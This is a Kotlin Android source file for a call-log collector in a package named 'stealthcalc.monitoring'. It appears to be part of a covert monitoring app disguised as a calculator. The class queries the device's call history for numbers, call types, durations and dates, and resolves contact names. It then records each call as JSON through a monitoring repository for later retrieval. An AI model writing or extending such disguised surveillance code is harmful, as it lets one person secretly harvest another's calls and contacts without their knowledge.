package com.stealthcalc.monitoring.collector

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.database.Cursor
import android.net.Uri
import android.provider.CallLog
import android.provider.ContactsContract
import androidx.core.content.ContextCompat
import com.stealthcalc.monitoring.data.MonitoringRepository
import com.stealthcalc.monitoring.model.CallLogPayload
import com.stealthcalc.monitoring.model.MonitoringEventKind
import dagger.hilt.android.qualifiers.ApplicationContext
import kotlinx.serialization.encodeToString
import kotlinx.serialization.json.Json
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CallLogCollector @Inject constructor(
    @ApplicationContext private val context: Context,
    private val repository: MonitoringRepository,
) {
    private var lastPollDate: Long = System.currentTimeMillis()

    fun hasPermission(): Boolean =
        ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CALL_LOG) ==
                PackageManager.PERMISSION_GRANTED

    suspend fun collect() {
        if (!repository.isMetricEnabled("call_log")) return
        if (!hasPermission()) return

        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            arrayOf(
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.TYPE,
                CallLog.Calls.DURATION,
                CallLog.Calls.DATE,
            ),
            "${CallLog.Calls.DATE} > ?",
            arrayOf(lastPollDate.toString()),
            "${CallLog.Calls.DATE} ASC"
        )

        cursor?.use {
            while (it.moveToNext()) {
                val number = it.getString(0) ?: ""
                val cachedName = it.getString(1)
                val type = it.getInt(2)
                val duration = it.getInt(3)
                val date = it.getLong(4)

                val contactName = cachedName ?: resolveContact(number)
                val typeStr = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "INCOMING"
                    CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
                    CallLog.Calls.MISSED_TYPE -> "MISSED"
                    CallLog.Calls.REJECTED_TYPE -> "REJECTED"
                    else -> "UNKNOWN"
                }

                val payload = Json.encodeToString(
                    CallLogPayload(
                        number = number,
                        contactName = contactName,
                        type = typeStr,
                        duration = duration,
                        date = date,
                    )
                )
                repository.recordEvent(MonitoringEventKind.CALL_LOG, payload)
                if (date > lastPollDate) lastPollDate = date
            }
        }
    }

    private fun resolveContact(number: String): String? {
        if (ContextCompat.checkSelfPermission(context, Manifest.permission.READ_CONTACTS) !=
            PackageManager.PERMISSION_GRANTED) return null

        val uri = Uri.withAppendedPath(
            ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
            Uri.encode(number)
        )
        return runCatching {
            context.contentResolver.query(
                uri,
                arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME),
                null, null, null
            )?.use { cursor ->
                if (cursor.moveToFirst()) cursor.getString(0) else null
            }
        }.getOrNull()
    }
}
